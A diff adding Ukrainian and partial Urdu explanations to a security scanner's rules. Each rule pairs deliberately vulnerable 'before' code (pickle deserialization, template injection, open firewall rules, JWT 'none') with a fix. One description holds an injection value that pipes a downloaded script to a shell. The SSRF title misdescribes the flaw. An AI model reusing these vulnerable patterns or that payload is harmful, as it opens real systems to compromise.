+      "Оператор $where у MongoDB виконує JavaScript на стороні сервера для кожного документа — якщо цей рядок побудований шляхом конкатенації значення, яке надходить від користувача, той, хто його контролює, може змусити виконати довільний код у контексті бази даних, а не лише змінити фільтр, як при звичайній SQL injection.",
+    fix: {
+      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
+      after: `db.collection.find({ username: username })`,
+    },
+  },
+  ssti: {
+    title: "Значення, введене користувачем, інтерпретується як шаблон, а не як дані",
+    description:
+      "Функція, яка компілює/виконує шаблон, отримує ЦІЛИЙ шаблон зі значення запиту, замість того, щоб використовувати фіксований шаблон і передавати лише дані. Зловмисник може писати напряму в синтаксисі шаблонного рушія (напр. {{7*7}} для Jinja2) і виконувати код на сервері — Server-Side Template Injection, що часто веде до виконання довільних команд, а не лише до проблеми з відображенням, як XSS.",
+    fix: {
+      before: `return render_template_string(request.args.get("name"))`,
+      after: `return render_template("profile.html", name=request.args.get("name"))`,
+    },
+  },
+  xxe: {
+    title: "XML-парсер можна змусити читати файли або робити зовнішні запити",
+    description:
+      "XML-парсер (DocumentBuilderFactory) створюється без явного вимкнення зовнішніх сутностей (DOCTYPE) у сусідніх рядках. Якщо парсер отримує XML з ненадійного джерела, зловмисник може визначити зовнішню сутність, щоб прочитати файли на сервері або змусити його звернутися до обраної ним адреси — XML External Entity.",
+    fix: {
+      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+    },
+  },
+  "docker-hardcoded-secret": {
+    title: "Секрет прописаний напряму в інструкції ENV або ARG Dockerfile",
+    description:
+      "Змінна з назвою на кшталт password/secret/token/key має буквальне значення в інструкції ENV або ARG. На відміну від файлу .env (який зазвичай не потрапляє в образ), це значення вбудовується в сам Docker-образ — будь-хто, хто може зробити pull або перевірити історію шарів, зможе його відновити, навіть якщо рядок видалено в пізнішій версії Dockerfile.",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# передається через: docker build --build-arg DB_PASSWORD=*** (або, ще краще,\n# через secret mount BuildKit, який не потрапляє в історію шарів)`,
+    },
+  },
+  "k8s-privileged-container": {
+    title: "Контейнер у маніфесті Kubernetes працює як privileged",
+    description:
+      '"privileged: true" у securityContext контейнера вимикає майже всю звичайну ізоляцію між контейнером і хостом: контейнер може отримати доступ до пристроїв хоста, змінити його мережеву конфігурацію і в багатьох випадках фактично отримати root-доступ до машини, яка його виконує. Майже ніколи не потрібно для звичайного застосунку.',
+    fix: {
+      before: `securityContext:\n  privileged: true`,
+      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # лише справді необхідні capability`,
+    },
+  },
+  "k8s-plaintext-secret-env": {
+    title: "Секрет записаний відкритим текстом у змінній env маніфесту Kubernetes",
+    description:
+      'Змінна середовища з назвою на кшталт password/secret/token/key має буквальне значення ("value:") замість того, щоб зчитуватися з Secret ("valueFrom.secretKeyRef"). Сам маніфест — часто закомічений у репозиторій — тому містить секрет відкритим текстом, видимим навіть для того, хто може лише читати конфігурацію, а не обов\'язково виконувати команди в кластері.',
+    fix: {
+      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
+      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
+    },
+  },
+  "terraform-open-security-group": {
+    title: "Security group Terraform відкриває чутливий порт для всього інтернету",
+    description:
+      'Правило з "cidr_blocks", що включає 0.0.0.0/0 (будь-яку IP-адресу), знаходиться поряд із чутливим портом — SSH (22), RDP (3389) або типовим портом бази даних (MySQL, Postgres, MongoDB, Redis, SQL Server). Будь-хто в інтернеті може спробувати підключитися до цього сервісу, а не лише той, хто повинен.',
+    fix: {
+      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
+      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # лише ваша приватна мережа або bastion-хост\n}`,
+    },
+  },
+  "gcp-firewall-open-to-internet": {
+    title: "Правило брандмауера Google Cloud відкриває чутливий порт для всього інтернету",
+    description:
+      'Ресурс "google_compute_firewall" з "source_ranges", що включає 0.0.0.0/0 (будь-яку IP-адресу), дозволяє трафік до чутливого порту — SSH (22), RDP (3389) або типового порту бази даних (MySQL, Postgres, MongoDB, Redis, SQL Server). Будь-хто в інтернеті може спробувати підключитися до цього сервісу, а не лише той, хто повинен.',
+    fix: {
+      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
+      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # лише ваша приватна мережа або bastion-хост\n}`,
+    },
+  },
+  "azure-nsg-open-to-internet": {
+    title: "Правило мережі Azure відкриває чутливий порт для всього інтернету",
+    description:
+      'Правило безпеки мережі ("azurerm_network_security_rule", або блок "security_rule" всередині "azurerm_network_security_group") із "source_address_prefix" на "*" або "0.0.0.0/0", напрямком "Inbound" і доступом "Allow", поряд із чутливим портом — SSH (22), RDP (3389) або типовим портом бази даних. Будь-хто в інтернеті може спробувати підключитися до цього сервісу, а не лише той, хто повинен.',
+    fix: {
+      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # лише ваша приватна мережа або bastion-хост\n}`,
+    },
+  },
+  "terraform-hardcoded-secret": {
+    title: "Секрет записаний як значення за замовчуванням змінної Terraform",
+    description:
+      'Змінна з назвою на кшталт password/secret/token/key має буквальне значення у своєму "default". На відміну від значення, переданого під час виконання (tfvars, змінні середовища TF_VAR_*), значення за замовчуванням потрапляє у вихідний код — і якщо репозиторій спільний або публічний, будь-хто його побачить, навіть без доступу до стану Terraform.',
+    fix: {
+      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
+      after: `variable "db_password" {\n  # без значення за замовчуванням: передавайте через файл .tfvars (поза git) або змінну середовища TF_VAR_db_password\n  sensitive = true\n}`,
+    },
+  },
+  "gha-script-injection": {
+    title: "Значення, яке контролює зовнішній користувач, напряму потрапляє в команду shell CI",
+    description:
+      'Команда "run:" у workflow GitHub Actions напряму інтерполює значення на кшталт заголовка pull request, назви гілки або тексту коментаря — усе це може написати будь-хто, хто відкриває pull request чи коментар, навіть з зовнішнього форку. Значення на кшталт `"; curl malware.sh | sh #` виконало б довільні команди в CI з доступом до всіх секретів, доступних у цьому workflow.',
+    fix: {
+      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
+      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # передається як змінна середовища, ніколи не інтерполюється напряму в команду`,
+    },
+  },
+  "gha-pull-request-target-checkout": {
+    title: "Workflow виконує код зовнішнього pull request з доступом до секретів репозиторію",
+    description:
+      'Workflow використовує "pull_request_target" — який працює з правами та секретами базового репозиторію навіть для pull request, відкритого з несв\'язаного форку — і робить checkout коду самого pull request ("github.event.pull_request.head"), а не базової гілки. Той, хто відкриває pull request, фактично отримує виконання свого коду з доступом до цих секретів.',
+    fix: {
+      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Робить checkout базової гілки, а не коду PR — або використовуйте\n      # "pull_request" замість "pull_request_target", якщо ширші\n      # права/секрети не потрібні.\n      - uses: actions/checkout@v4`,
+    },
+  },
+  "insecure-deserialization": {
+    title: "Дані запиту десеріалізуються у форматі, який може виконувати код",
+    description:
+      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) або бібліотека node-serialize (Node) десеріалізують значення, взяте напряму із запиту. На відміну від JSON, ці формати можуть представляти й виконувати код під час самої десеріалізації — той, хто контролює надіслане значення, може досягти виконання довільного коду на сервері.",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json\ndata = json.loads(request.data)  # JSON ніколи не виконує код під час парсингу, на відміну від pickle`,
+    },
+  },
+  "jwt-none-algorithm": {
+    title: 'Код явно приймає непідписані JWT-токени (алгоритм "none")',
+    description:
+      '"none" з\'являється серед алгоритмів, прийнятих для перевірки JWT-токена. Токен з алгоритмом "none" не має підпису для перевірки: будь-хто може створити такий з будь-яким вмістом (напр. роль адміністратора), і код прийме його як дійсний.',
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // ніколи не включайте "none" серед прийнятих алгоритмів`,
+    },
+  },
+  "unprotected-new-table": {
+    title: "Схоже, нова таблиця створена без захисту",
+    description:
+      "SQL-міграція створює таблицю, але не вмикає Row Level Security для цієї ж таблиці в тому самому файлі. Поки це так, таблиця з'являється без жодного обмеження на те, хто може її читати чи записувати.",
+    fix: {
+      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
+      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
+    },
+  },
+  "permissive-cors": {
+    title: "Сайт приймає запити з будь-якого іншого сайту",
+    description:
+      "Заголовок CORS налаштований так, щоб приймати запити з будь-якого джерела (*), або middleware cors() використовується без обмежень. Будь-який сторонній сайт може викликати ваші API з браузера вже автентифікованого користувача.",
+    fix: {
+      before: `app.use(cors())`,
+      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
+    },
+  },
+  "admin-function-missing-auth": {
+    title: "Функція з правами адміністратора не перевіряє, хто нею користується",
+    description:
+      "Маршрут або функція, назва якої натякає на адміністративні операції, не містить у сусідніх рядках жодної перевірки автентифікації чи ролі. Будь-хто, хто знає URL, міг би її виконати.",
+    fix: {
+      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+    },
+  },
+  ssrf: {
+    title: "Сайт можна змусити виконати зовнішній код",
+    description:
+      "Вихідний HTTP-запит (fetch, axios) напряму використовує значення, що надходить із запиту користувача, як URL призначення. Зловмисник може змусити ваш сервер звертатися до внутрішніх або довільних адрес — Server-Side Request Forgery.",
+    fix: {
+      before: `const data = await fetch(req.query.url)`,
+      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL не дозволено")\nconst data = await fetch(req.query.url)`,
+    },
+  },
+  "weak-password-hashing": {
+    title: "Паролі захищені методом, який тепер легко зламати",
+    description:
+      "У тому самому рядку md5() або sha1() застосовуються до значення, пов'язаного з паролем. Ці алгоритми обчислюються надто швидко: зловмисник із базою даних може перебрати мільярди паролів за секунду.",
+    fix: {
+      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
+      after: `const hashed = await bcrypt.hash(password, 12)`,
+    },
+  },
+  "k8s-run-as-root": {
+    title: "Контейнер у маніфесті Kubernetes налаштований на роботу як root",
+    description:
+      '"runAsUser: 0" або "runAsNonRoot: false" у securityContext явно вимагають виконання як root усередині контейнера. Якщо зловмиснику вдасться виконати код у контейнері (напр. скориставшись вразливою бібліотекою), root усередині контейнера полегшує можливу втечу на хост або ширший вплив.',
+    fix: {
+      before: `securityContext:\n  runAsUser: 0`,
+      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
+    },
+  },
+  "k8s-privilege-escalation": {
+    title: "Контейнер у маніфесті Kubernetes може отримати більше привілеїв, ніж мав спочатку",
+    description:
+      '"allowPrivilegeEscalation: true" у securityContext дозволяє процесу всередині контейнера отримати більше привілеїв, ніж мав процес, що його запустив (напр. через бінарник із setuid). У поєднанні з вразливістю в застосунку це ще один крок до виконання коду з більшими привілеями, ніж передбачалося.',
+    fix: {
+      before: `securityContext:\n  allowPrivilegeEscalation: true`,
+      after: `securityContext:\n  allowPrivilegeEscalation: false`,
+    },
+  },
+  "k8s-host-namespace-access": {
+    title: "Под у маніфесті Kubernetes ділить мережу, процеси або спільну пам'ять хоста",
+    description:
+      '"hostNetwork", "hostPID" або "hostIPC", встановлені в true, виводять под з його звичайної ізоляції: hostNetwork виставляє под у мережу хоста (обходячи мережеві політики кластера), hostPID дає йому видимість усіх процесів хост-машини, hostIPC дає доступ до спільної пам\'яті хоста. Майже ніколи не потрібно для звичайного застосунку — типово лише для низькорівневих системних/моніторингових інструментів.',
+    fix: {
+      before: `spec:\n  hostNetwork: true`,
+      after: `spec:\n  hostNetwork: false`,
+    },
+  },
+  "terraform-s3-block-public-access-disabled": {
+    title: "Block Public Access вимкнено на S3-бакеті, визначеному в Terraform",
+    description:
+      'Один або кілька з чотирьох захистів "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) встановлені в false. Це не означає, що бакет уже публічний, але знімає запобіжник, який завадив би зробити його публічним помилково в майбутньому.',
+    fix: {
+      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
+      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
+    },
+  },
+  "terraform-iam-wildcard-policy": {
+    title: "IAM-політика, визначена в Terraform, надає повний доступ",
+    description:
+      'Statement з дією "*" і ресурсом "*" надає повний доступ до кожного сервісу й ресурсу AWS — та сама перевірка, що вже робиться на живому стані IAM, тут зчитана напряму з коду ще до застосування. Можливо, це навмисно для аварійної ролі, але це варто підтвердити: для щоденного використання надавайте лише справді необхідні права.',
+    fix: {
+      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
+      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
+    },
+  },
+  "gcp-storage-bucket-public": {
+    title: "Бакет Google Cloud Storage зроблено доступним для читання будь-ким",
+    description:
+      'Ресурс "google_storage_bucket_iam_member" або "google_storage_bucket_iam_binding" надає роль "allUsers" або "allAuthenticatedUsers" — перше робить бакет доступним для читання будь-ким в інтернеті, навіть без облікового запису Google; друге — будь-ким з будь-яким обліковим записом Google, а не лише тим, хто повинен мати доступ.',
+    fix: {
+      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # лише той, хто справді повинен мати доступ, а не allUsers/allAuthenticatedUsers\n}`,
+    },
+  },
+  "azure-storage-public-access": {
+    title: "Публічний доступ до blob увімкнено на обліковому записі сховища Azure",
+    description:
+      '"allow_blob_public_access" встановлено в true на "azurerm_storage_account": будь-хто, хто знає URL зробленого публічним blob/контейнера, може його прочитати без жодної автентифікації.',
+    fix: {
+      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
+      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
+    },
+  },
+  "gcp-iam-overly-broad-role": {
+    title: "IAM-роль Google Cloud надає повний доступ (Owner/Editor)",
+    description:
+      '"google_project_iam_binding"/"google_project_iam_member" (або еквівалент на рівні організації/папки) призначає примітивну роль "roles/owner" або "roles/editor" — майже повний доступ до кожного сервісу в проєкті. Можливо, це навмисно для аварійного облікового запису, але це варто підтвердити: для щоденного використання надавайте лише справді необхідні, конкретніші попередньо визначені ролі.',
+    fix: {
+      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
+      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # лише справді потрібна попередньо визначена роль, а не roles/owner\n  member  = "user:dev@example.com"\n}`,
+    },
+  },
+  "azure-role-assignment-owner": {
+    title: "Призначення ролі Azure надає повний доступ (Owner)",
+    description:
+      '"azurerm_role_assignment" призначає роль "Owner" — повний доступ, включно з контролем над правами інших користувачів, у межах усього призначеного обсягу (підписка, група ресурсів...). Можливо, це навмисно для аварійного облікового запису, але це варто підтвердити: для щоденного використання надавайте лише справді потрібну конкретнішу роль (напр. "Contributor" на одній групі ресурсів).',
+    fix: {
+      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
+      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # лише справді потрібна конкретніша роль, а не Owner на всій підписці\n}`,
+    },
+  },
+  "weak-random-token": {
+    title: "Токен безпеки згенеровано за допомогою генератора випадкових чисел, який не є криптографічно надійним",
+    description:
+      "Значення з назвою на кшталт token/session/reset/otp/csrf генерується за допомогою Math.random() (JS), random.random() (Python) або rand() (PHP) — генераторів, не призначених для безпеки, послідовності яких передбачувані. Токен, згенерований таким чином, можна вгадати або відтворити, що зводить нанівець мету, заради якої він існує (напр. посилання для скидання пароля, яке будь-хто міг би передбачити).",
+    fix: {
+      before: `const resetToken = Math.random().toString(36).slice(2);`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, а не Math.random — непередбачувано`,
+    },
+  },
+  "ldap-injection": {
+    title: "LDAP-фільтр побудований шляхом прямої конкатенації значення запиту",
+    description:
+      'Рядок, що будує LDAP-фільтр (напр. "(uid=...)"), напряму включає значення, взяте із запиту, без жодного екранування спеціальних символів LDAP. Той, хто контролює це значення, може змінити логіку фільтра — наприклад, обійти перевірку автентифікації або прочитати дані каталогу, які не повинен бачити.',
+    fix: {
+      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
+      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // спеціальні символи LDAP завжди потрібно екранувати перед використанням у фільтрі\nclient.search(base, { filter });`,
+    },
+  },
+  "xss-dangerous-html": {
+    title: "Текст, написаний користувачами, міг би виконати код у браузері",
+    description:
+      "Вміст вставляється на сторінку як сирий HTML (dangerouslySetInnerHTML, v-html, .innerHTML) замість звичайного тексту. Якщо цей вміст включає введені користувачем дані, він може містити скрипти, які виконуються в браузері того, хто читає сторінку.",
+    fix: {
+      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
+      after: `<div>{comment.text}</div>\n// або, якщо потрібен HTML: DOMPurify.sanitize(comment.text)`,
+    },
+  },
+  "public-storage-bucket": {
+    title: "Простір для завантажених файлів видимий будь-кому",
+    description:
+      "Бакет сховища (Supabase Storage, S3) налаштовано як публічний. Якщо він містить документи, фото чи файли, завантажені користувачами, будь-хто, хто знає — або вгадає — шлях, може отримати до них доступ без автентифікації.",
+    fix: {
+      before: `supabase.storage.createBucket("uploads", { public: true })`,
+      after: `supabase.storage.createBucket("uploads", { public: false })\n// надавайте файли через тимчасові підписані URL: createSignedUrl(path, 60)`,
+    },
+  },
+  "csrf-state-changing-get": {
+    title: "Достатньо одного посилання, щоб видалити або змінити дані",
+    description:
+      "GET-маршрут виконує операцію, яка змінює дані (шлях містить delete/remove/update/edit). GET-запити виконуються навіть просто при відвідуванні посилання або завантаженні зображення зі стороннього сайту — класична опорна точка для CSRF-атаки.",
+    fix: {
+      before: `router.get("/posts/:id/delete", deletePost)`,
+      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
+    },
+  },
+  "insecure-token-storage": {
+    title: "Дані входу, збережені в браузері, захищені не дуже добре",
+    description:
+      "Токен доступу зберігається в localStorage. На відміну від cookie httpOnly, будь-який скрипт, що виконується на сторінці (включно зі зловмисним, впровадженим через XSS), може його прочитати й викрасти.",
+    fix: {
+      before: `localStorage.setItem("authToken", token)`,
+      after: `// встановлюйте токен як cookie httpOnly із сервера:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "open-redirect": {
+    title: "Сайт можна використати для перенаправлення на шахрайський сайт",
+    description:
+      "Сайт перенаправляє користувача на адресу, взяту напряму із запиту (query, body, params), без перевірки, що це відомий домен. Посилання, яке виглядає так, ніби веде на ваш сайт, насправді може вести на фішингову сторінку.",
+    fix: {
+      before: `res.redirect(req.query.next)`,
+      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
+    },
+  },
+  idor: {
+    title: "Змінивши число в адресі, можна побачити чужі дані",
+    description:
+      "Запит до бази даних напряму використовує ідентифікатор, взятий з URL (req.params.id), без перевірки в сусідніх рядках, що він належить користувачу, який робить запит. Змінивши id в адресі, можна отримати доступ до даних іншого користувача — Insecure Direct Object Reference.",
+    fix: {
+      before: `const order = await Order.findById(req.params.id)`,
+      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
+    },
+  },
+  "no-login-rate-limit": {
+    title: "Форма входу не блокує забагато спроб поспіль",
+    description:
+      "Маршрут входу визначений у файлі, але в тому самому файлі немає жодних слідів middleware для обмеження частоти запитів. Без обмеження на кількість спроб зловмисник може перебирати паролі послідовно (brute force), не зустрічаючи уповільнення.",
+    fix: {
+      before: `router.post("/login", loginHandler)`,
+      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
+    },
+  },
+  "sensitive-data-in-logs": {
+    title: "Паролі або чутливі дані потрапляють у логи",
+    description:
+      "Виклик console.log (або подібний) включає змінну з назвою password, token, secret або apiKey. Якщо ці логи потрапляють у зовнішній сервіс або файл, чутливі дані залишаються відкритими значно довше, ніж потрібно.",
+    fix: {
+      before: `console.log("login attempt", { email, password })`,
+      after: `console.log("login attempt", { email })`,
+    },
+  },
+  "header-injection": {
+    title: "Значення запиту напряму потрапляє в заголовок HTTP-відповіді",
+    description:
+      "Заголовок HTTP-відповіді встановлюється зі значенням, взятим напряму із запиту (query, body, params), без перевірки, що воно не містить переносу рядка (CRLF). Зловмисник може вставити додаткові заголовки або навіть цілком іншу відповідь — response splitting — отримуючи змогу маніпулювати кешем, cookie або вмістом, показаним іншим користувачам.",
+    fix: {
+      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
+      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
+    },
+  },
+  "docker-missing-user": {
+    title: "Dockerfile не встановлює користувача, відмінного від root",
+    description:
+      "У Dockerfile немає інструкції USER: без неї контейнер працює як root. Якщо зловмиснику вдається виконати код усередині контейнера (напр. скориставшись вразливою бібліотекою), root усередині контейнера полегшує можливу втечу на хост — або ширший вплив на навколишню систему.",
+    fix: {
+      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
+      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
+    },
+  },
+  "k8s-missing-run-as-non-root": {
+    title: "Маніфест Kubernetes явно не вимагає виконання від імені користувача, відмінного від root",
+    description:
+      'У маніфесті немає жодного "runAsNonRoot" (ні на рівні пода, ні контейнера): без цього налаштування контейнер працює від імені користувача, визначеного в його образі — часто root за замовчуванням, якщо сам образ цього не змінив. Явне встановлення в true призводить до того, що под не запуститься, якщо образ усе ж намагається працювати як root, замість того щоб дізнатися про це лише після інциденту.',
+    fix: {
+      before: `containers:\n  - name: app\n    image: myapp:1.0`,
+      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "Стороння дія в CI не зафіксована на точній версії (commit SHA)",
+    description:
+      'Workflow використовує сторонню дію, на яку посилаються за тегом або гілкою (напр. "@v1", "@main"), а не за commit SHA. Той, хто її підтримує — або хто скомпрометує його обліковий запис — може будь-коли перемістити це посилання на інший commit, непомітно змінивши те, що виконується в CI, з доступом до його секретів. Commit SHA завжди вказує на той самий код.',
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, зафіксовано на commit SHA — оновлюйте SHA, коли оновлюєте версію`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "Workflow надає собі всі права токена замість лише тих, що використовує",
+    description:
+      '"permissions: write-all" надає GITHUB_TOKEN workflow права на запис до всього — issues, pull request, пакетів, деплоїв — навіть якщо workflow використовує лише частину цього. Якщо якийсь крок workflow буде скомпрометовано (зловмисна залежність, впроваджений скрипт), ці ширші права збільшують те, що може зробити той, хто цим скористається.',
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:\n  contents: read\n  pull-requests: write  # лише права, які workflow справді використовує`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "Cookie сесії або автентифікації встановлено без прапорців Secure і HttpOnly",
+    description:
+      'Cookie з назвою, схожою на session/auth/token, встановлюється без "httpOnly" і "secure" серед своїх параметрів. Без httpOnly JavaScript на сторінці — включно з кодом, впровадженим через XSS, — може прочитати цей cookie. Без secure його також можна надіслати через незашифроване HTTP-з\'єднання.',
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "vulnerable-dependency": (original) => ({
+    title: original.title.replace("Dipendenza vulnerabile:", "Вразлива залежність:"),
+    description: original.description,
+    fix: {
+      before: original.fix.before,
+      after: original.fix.after.replace(
+        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
+        "Виправлену версію ще не відомо — розгляньте альтернативний пакет або стежте за оновленнями проєкту."
+      ),
+    },
+  }),
+  "docker-unpinned-base-image": {
+    title: 'Базовий образ Dockerfile використовує тег ":latest"',
+    description:
+      'Інструкція FROM явно використовує тег ":latest" замість точної версії. "latest" змінюється з часом: та сама збірка, повторена в інший момент, може отримати іншу версію базового образу — невідтворювана збірка, і небажане оновлення може прийти без чийогось рішення про це.',
+    fix: {
+      before: `FROM node:latest`,
+      after: `FROM node:20.11-slim`,
+    },
+  },
+  "docker-add-remote-url": {
+    title: "Dockerfile завантажує віддалений файл через ADD замість COPY",
+    description:
+      "Інструкція ADD з URL http/https завантажує файл з інтернету під час збірки без перевірки цілісності та без видимості вмісту в репозиторії. Якщо цю URL-адресу колись скомпрометують, збірка включить довільний вміст, і ніхто цього не помітить, читаючи Dockerfile.",
+    fix: {
+      before: `ADD https://example.com/install.sh /tmp/install.sh`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<очікуваний hash>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
+},
+  ur: {
+  "supabase-service-role-in-client": {
+    title: "Supabase کی سیکریٹ کی (secret key) ایسے حصے میں پہنچ جاتی ہے جو براؤزر کے لیے بنایا گیا ہے",
+    description:
+      "عوامی prefix والا (مثلاً NEXT_PUBLIC_، VITE_) کوئی variable یا کلائنٹ سائیڈ کی کوئی فائل Supabase کی service role key کا حوالہ دیتی ہے۔ یہ کی Row Level Security کو bypass کر دیتی ہے: اگر یہ براؤزر کے bundle میں پہنچ جائے تو کوئی بھی اسے پڑھ کر ڈیٹا بیس پر ایڈمنسٹریٹر کی طرح کام کر سکتا ہے۔",
+    fix: {
+      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (صرف سرور)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+    },
+  },
+  "hardcoded-secret": {
+    title: "کوڈ میں براہ راست پاس ورڈز یا سیکریٹ کیز لکھی ہوئی ہیں",
+    description:
+      "کوئی API key، ٹوکن یا پاس ورڈ environment variable سے پڑھنے کے بجائے براہ راست لفظی قدر کے طور پر لکھا ہوا معلوم ہوتا ہے۔ جو بھی سورس کوڈ (یا، اگر عوامی ہو تو، ریپوزٹری) پڑھے گا، اسے وہ راز مل جائے گا۔",
+    fix: {
+      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
+      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
+    },
+  },
+  "env-file-with-real-values": {
+    title: "پراجیکٹ کے اصل پاس ورڈز والی ایک فائل بھی تجزیہ کی جانے والی فائلوں میں شامل ہے",
+    description:
+      "اصل قدروں والی ایک .env فائل (نہ کہ .env.example) تجزیے میں شامل ہے۔ اگر یہ فائل کسی ریپوزٹری یا عوامی deploy میں چلی جائے تو اس میں موجود تمام credentials بے نقاب ہو جاتے ہیں۔",
+    fix: {
+      before: `# .env (غلطی سے commit کی گئی)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
